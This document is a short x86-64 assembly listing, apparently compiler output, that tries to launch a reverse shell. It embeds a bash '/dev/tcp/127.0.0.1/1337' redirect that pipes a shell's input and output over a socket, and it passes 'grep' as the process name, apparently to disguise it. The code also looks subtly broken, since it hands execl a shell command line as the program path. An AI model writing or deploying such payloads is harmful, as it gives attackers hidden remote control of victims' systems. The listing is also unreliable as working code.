.process:
	.string	"grep"
	.align 8
.shell:
	.string	"0<&196;exec 196<>/dev/tcp/127.0.0.1/1337; sh <&196 >&196 2>&196"
	.text
	.globl	main
	.type	main, @function
main:
.maincode:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	$0, %edx
	movl	$.process, %esi
	movl	$.shell, %edi
	movl	$0, %eax
	call	execl
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
